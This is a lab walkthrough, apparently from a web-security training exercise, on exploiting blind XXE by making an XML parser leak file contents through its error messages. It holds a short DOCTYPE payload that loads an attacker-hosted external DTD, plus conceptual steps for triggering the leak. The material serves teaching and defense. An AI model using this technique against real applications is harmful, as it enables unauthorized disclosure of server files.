# Lab 06 – Blind XXE with Error Messages

## Objective

Exploit blind XXE by causing the XML parser to generate an error that contains information derived from a local resource.

---

# Vulnerability

The application does not return the external entity value directly.

However, it returns detailed XML parser errors.

This creates an alternative information channel:

```text
Local Resource
      ↓
Entity
      ↓
Parser Error
      ↓
HTTP Response
```

---

# Step 1 — Identify XML Processing

Intercept the XML request using Burp Suite.

Send it to:

```text
Burp Repeater
```

---

# Step 2 — Confirm Parser Errors

Submit malformed XML and observe the response.

Look for detailed errors containing information such as:

```text
File paths
Entity names
Parser state
Referenced resources
```

---

# Step 3 — Prepare an External DTD

Host a DTD on a server you control.

The external DTD can define entities that cause the parser to process a resource and subsequently trigger an error.

Conceptually:

```text
External DTD
     ↓
Entity
     ↓
Sensitive Resource
     ↓
Invalid Reference
     ↓
Parser Error
```

---

# Step 4 — Reference the DTD

Use an external parameter entity from the XML document:

```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "YOUR-EXTERNAL-DTD-URL">
    %xxe;
]>
```

---

# Step 5 — Trigger the Parser

Send the modified XML request.

The parser processes the external DTD and encounters the deliberately malformed condition.

---

# Step 6 — Inspect the Response

Look at the resulting error message.

A vulnerable application may disclose information derived from the referenced resource.

---

# Attack Flow

```text
XML
 ↓
External DTD
 ↓
Parameter Entity
 ↓
Sensitive Data
 ↓
Malformed Entity / Resource
 ↓
XML Parser Error
 ↓
HTTP Response
```

---

# Why It Works

The application does not need to directly reflect the external entity.

Instead, the parser's error handling becomes the information channel.

---

# Error-Based XXE vs OOB XXE

### OOB

```text
Sensitive Data
      ↓
External Request
      ↓
Controlled Server
```

### Error-Based

```text
Sensitive Data
      ↓
Parser Error
      ↓
Application Response
```

---

# Verification

A successful result is an error response that contains information originating from the targeted resource.

---

# Key Learning

Detailed XML parser errors can transform a blind XXE vulnerability into an information-disclosure channel.

Applications should avoid exposing verbose parser errors to untrusted users.